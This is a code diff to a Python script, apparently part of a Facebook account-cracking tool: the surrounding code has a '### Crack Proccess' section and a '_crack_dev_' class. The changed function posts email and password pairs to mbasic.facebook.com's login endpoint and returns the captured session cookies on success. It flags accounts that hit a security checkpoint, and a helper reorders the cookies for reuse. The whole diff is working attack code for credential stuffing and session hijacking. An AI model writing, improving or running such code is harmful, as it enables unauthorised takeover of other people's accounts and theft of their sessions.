@@ -355,41 +355,17 @@ def log_mbasic(em,pas,hosts):
     r = requests.Session()
     r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
     p = r.get("https://mbasic.facebook.com/")
-    b = bs4.BeautifulSoup(p.text,"html.parser")
-    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
-    data={}
-    for i in b("input"):
-        if i.get("value") is None:
-            if i.get("name")=="email":
-                data.update({"email":em})
-            elif i.get("name")=="pass":
-                data.update({"pass":pas})
-            else:
-                data.update({i.get("name"):""})
-        else:
-            data.update({i.get("name"):i.get("value")})
-    data.update(
-        {"fb_dtsg":meta,"m_sess":"","__user":"0",
-        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
-        }
-    )
-    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
-    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
-    if "c_user" in list(r.cookies.get_dict().keys()):
-        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
-    elif "checkpoint" in list(r.cookies.get_dict().keys()):
-        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+    b = r.post("https://mbasic.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
+    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
+    if "c_user" in r.cookies.get_dict().keys():
+        return {"status":"success","email":em,"pass":pas,"cookies":_raw_cookies_}
+    elif "checkpoint" in r.cookies.get_dict().keys():
+        return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
     else:return {"status":"error","email":em,"pass":pas}
-def koki(cookies):
-    result=[]
-    for i in enumerate(cookies.keys()):
-        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
-        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
-    sample = "".join(result)
-    sam_   = sample.replace(' ','')
-    samp_  = sam_.split(';')
-    final = ('%s; %s; %s; %s; %s'%(samp_[4],samp_[1],samp_[0],samp_[5],samp_[3]))
-    return final
+def koki(_cookies_):
+    samp_  = _cookies_.split(';')
+    _cooked_cookies_ = ('%s;%s;%s;%s;%s'%(samp_[2],samp_[4],samp_[0],samp_[3],samp_[1]))
+    return _cooked_cookies_
 
 ### Crack Proccess
 class _crack_dev_:
